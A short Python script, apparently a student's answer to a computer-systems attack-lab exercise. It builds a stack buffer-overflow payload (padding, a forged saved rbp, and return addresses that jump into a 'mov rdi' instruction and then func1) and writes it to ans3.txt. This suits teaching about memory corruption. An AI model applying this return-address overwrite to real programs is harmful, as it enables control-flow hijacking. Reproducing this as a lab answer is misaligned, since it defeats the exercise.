# Python脚本生成利用载荷，并写入ans3.txt

# 定义各个函数和目标地址的地址（小端格式）
# 注意：这些地址应根据实际情况进行调整
padding = b'A' * 24                                # 覆盖保存的 rbp
x = b'\x72\x00\x00\x00\x00\x00\x00\x00'            # rbp-8的值设置成0x72
rbp = b'\xd0\xda\xff\xff\xff\x7f\x00\x00'          # 设置old rbp为func栈帧内rbp
mov = b'\xe6\x12\x40\x00\x00\x00\x00\x00'          # 直接跳到mov rdi的mov语句，确保能正常更改rdi
func1 = b'\x16\x12\x40\x00\x00\x00\x00\x00'        # func1函数地址





payload = padding + x + rbp + mov + func1

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans3.txt")
